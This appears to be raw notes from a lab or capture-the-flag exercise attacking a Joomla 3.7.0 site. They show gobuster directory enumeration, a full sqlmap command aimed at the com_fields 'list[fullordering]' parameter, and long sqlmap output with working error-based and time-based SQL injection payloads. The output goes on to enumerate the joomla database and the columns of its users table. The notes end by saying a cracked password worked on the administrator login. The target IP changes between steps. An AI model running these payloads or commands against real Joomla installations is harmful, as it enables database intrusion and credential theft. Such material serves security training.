===============================================================
[+] Url:                     http://10.10.132.218
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 236] [--> http://10.10.132.218/images/]
/media                (Status: 301) [Size: 235] [--> http://10.10.132.218/media/]
/templates            (Status: 301) [Size: 239] [--> http://10.10.132.218/templates/]
/modules              (Status: 301) [Size: 237] [--> http://10.10.132.218/modules/]
/bin                  (Status: 301) [Size: 233] [--> http://10.10.132.218/bin/]
/plugins              (Status: 301) [Size: 237] [--> http://10.10.132.218/plugins/]
/includes             (Status: 301) [Size: 238] [--> http://10.10.132.218/includes/]
/language             (Status: 301) [Size: 238] [--> http://10.10.132.218/language/]
/components           (Status: 301) [Size: 240] [--> http://10.10.132.218/components/]
/cache                (Status: 301) [Size: 235] [--> http://10.10.132.218/cache/]
/libraries            (Status: 301) [Size: 239] [--> http://10.10.132.218/libraries/]
/tmp                  (Status: 301) [Size: 233] [--> http://10.10.132.218/tmp/]
/layouts              (Status: 301) [Size: 237] [--> http://10.10.132.218/layouts/]
/administrator        (Status: 301) [Size: 243] [--> http://10.10.132.218/administrator/]
/cli                  (Status: 301) [Size: 233] [--> http://10.10.132.218/cli/]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================


After enumerating directories further I found http://10.10.108.40/administrator/manifests/files/joomla.xml

which housed joomla info and sure enough <version>3.7.0</version>, i kept digging around the manifests files

----------------------------------------------------------------
┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://10.10.151.132/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomla -T "#__users" --columns
        ___
       __H__                                                                                                                                          
 ___ ___["]_____ ___ ___  {1.9.2#stable}                                                                                                              
|_ -| . [)]     | .'| . |                                                                                                                             
|___|_  [)]_|_|_|__,|  _|                                                                                                                             
      |_|V...       |_|   https://sqlmap.org                                                                                                          

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:25:04 /2025-04-25/

[16:25:04] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.11 Safari/535.19' from file '/usr/share/sqlmap/data/txt/user-agents.txt'                                                              
[16:25:04] [INFO] testing connection to the target URL
[16:25:08] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
you have not declared cookie(s), while server wants to set its own ('eaa83fe8b963ab08ce9ab7d4a798de05=t7vvcpp79q5...vd8i2jqsu4'). Do you want to use those [Y/n] y
[16:25:10] [INFO] checking if the target is protected by some kind of WAF/IPS
[16:25:11] [INFO] testing if the target URL content is stable
[16:25:11] [INFO] target URL content is stable
[16:25:11] [INFO] heuristic (basic) test shows that GET parameter 'list[fullordering]' might be injectable (possible DBMS: 'MySQL')
[16:25:11] [INFO] testing for SQL injection on GET parameter 'list[fullordering]'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
[16:25:13] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[16:25:13] [WARNING] reflective value(s) found and filtering out
[16:25:34] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[16:25:50] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[16:26:13] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[16:27:32] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[16:28:52] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[16:29:39] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[16:29:55] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[16:30:04] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[16:30:04] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[16:30:05] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[16:30:05] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[16:30:06] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[16:30:06] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[16:31:03] [INFO] testing 'Generic inline queries'
[16:31:04] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[16:31:48] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[16:32:29] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[16:33:13] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[16:34:31] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[16:35:05] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[16:36:20] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[16:37:45] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[16:38:58] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[16:40:24] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[16:42:03] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[16:42:05] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[16:42:07] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[16:42:09] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[16:42:12] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[16:42:14] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[16:42:16] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[16:42:20] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[16:42:24] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[16:42:24] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[16:42:24] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[16:43:18] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[16:43:18] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[16:44:13] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[16:44:53] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[16:45:13] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[16:46:09] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[16:47:05] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[16:48:02] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[16:48:57] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[16:49:52] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[16:50:48] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[16:51:44] [INFO] testing 'MySQL >= 5.0 (inline) error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[16:51:46] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[16:52:41] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[16:53:36] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[16:54:32] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[16:54:57] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[16:55:33] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[16:56:28] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[16:56:55] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[16:57:33] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[16:57:34] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[16:57:35] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[16:57:36] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[16:57:37] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[16:57:38] [INFO] GET parameter 'list[fullordering]' is 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)' injectable 
[16:57:38] [INFO] testing 'MySQL inline queries'
[16:57:39] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[16:57:40] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[16:57:42] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[16:57:43] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[16:57:44] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[16:57:45] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[16:57:46] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[16:57:47] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
[16:57:48] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
[16:57:49] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
[16:57:50] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
[16:57:51] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'
[16:57:52] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
[16:57:53] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'
[16:57:54] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)'
[16:57:55] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query)'
[16:57:56] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK)'
[16:57:57] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query)'
[16:57:58] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK - comment)'
[16:57:59] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query - comment)'
[16:58:00] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK - comment)'
[16:58:01] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query - comment)'
[16:58:03] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
[16:58:04] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (comment)'
[16:58:05] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
[16:58:06] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)'
[16:58:07] [INFO] testing 'MySQL AND time-based blind (ELT)'
[16:58:08] [INFO] testing 'MySQL OR time-based blind (ELT)'
[16:58:09] [INFO] testing 'MySQL AND time-based blind (ELT - comment)'
[16:58:10] [INFO] testing 'MySQL OR time-based blind (ELT - comment)'
[16:58:11] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[16:58:12] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[16:58:13] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
[16:58:14] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)'
[16:58:27] [INFO] GET parameter 'list[fullordering]' appears to be 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)' injectable 
[16:58:27] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[16:58:27] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[16:58:49] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[16:59:11] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[16:59:31] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[16:59:50] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[16:59:53] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[16:59:58] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[17:00:04] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[17:00:25] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[17:00:46] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[17:01:06] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[17:01:29] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[17:01:50] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[17:02:12] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[17:02:32] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[17:02:53] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[17:03:14] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[17:03:34] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[17:03:55] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[17:04:15] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
GET parameter 'list[fullordering]' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 2746 HTTP(s) requests:
---
Parameter: list[fullordering] (GET)
    Type: error-based
    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 2528 FROM(SELECT COUNT(*),CONCAT(0x717a766271,(SELECT (ELT(2528=2528,1))),0x716a6b6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 4741 FROM (SELECT(SLEEP(5)))gIGU)
---
[18:14:46] [INFO] the back-end DBMS is MySQL
[18:14:46] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
web server operating system: Linux CentOS 7
web application technology: PHP 5.6.40, Apache 2.4.6
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[18:14:48] [INFO] fetching database names
[18:14:48] [INFO] retrieved: 'information_schema'
[18:14:48] [INFO] retrieved: 'joomla'
[18:14:48] [INFO] retrieved: 'mysql'
[18:14:49] [INFO] retrieved: 'performance_schema'
[18:14:49] [INFO] retrieved: 'test'
available databases [5]:
[*] information_schema
[*] joomla
[*] mysql
[*] performance_schema
[*] test

[18:14:49] [INFO] fetching columns for table '#__users' in database 'joomla'
[18:14:49] [WARNING] unable to retrieve column names for table '#__users' in database 'joomla'
do you want to use common column existence check? [y/N/q] y
[18:14:52] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
which common columns (wordlist) file do you want to use?
[1] default '/usr/share/sqlmap/data/txt/common-columns.txt' (press Enter)
[2] custom
> 1
[18:14:56] [INFO] checking column existence using items from '/usr/share/sqlmap/data/txt/common-columns.txt'
[18:14:56] [INFO] adding words used on web page to the check list
please enter number of threads? [Enter for 1 (current)] 

[18:15:00] [WARNING] running in a single-thread mode. This could take a while
[18:15:00] [INFO] retrieved: id                                                                                                                      
[18:15:00] [INFO] retrieved: name                                                                                                                    
[18:15:01] [INFO] retrieved: username                                                                                                                
[18:15:04] [INFO] retrieved: email                                                                                                                   
[18:15:36] [INFO] retrieved: password                                                                                                                
[18:21:56] [INFO] retrieved: params                                                                                                                  
 
Database: joomla
Table: joomla.#__users
[6 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| name     | non-numeric |
| email    | non-numeric |
| id       | numeric     |
| params   | numeric     |
| password | non-numeric |
| username | non-numeric |
+----------+-------------+

so safe to say I used the spiderman123 password we cracked on ssh logins to no avail (not for any of the accounts did spiderman123 work)

jonah
spiderman123 DID work for the 10. 10.116.31/administrator page though